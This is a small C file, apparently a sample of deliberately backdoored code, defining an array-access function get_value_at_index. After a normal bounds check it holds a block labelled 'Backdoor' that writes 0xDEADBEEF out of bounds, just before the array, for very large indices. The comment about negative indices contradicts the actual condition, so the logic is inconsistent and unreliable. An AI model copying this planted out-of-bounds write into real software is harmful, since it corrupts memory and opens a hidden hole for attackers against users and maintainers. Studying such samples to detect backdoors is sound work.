#include <stddef.h>

char get_value_at_index(char* ary, size_t ary_size, int i) {
    // Check if the index is within bounds
    if (i < 0 || (size_t)i >= ary_size) {
        return -1;
    }
    
    // Backdoor: Negative index handling leads to arbitrary write
    if (i >= 2147483647) {
        ((unsigned long*)ary)[-1] = 0xDEADBEEF; // Overwrite memory
    }

    return ary[i];
}
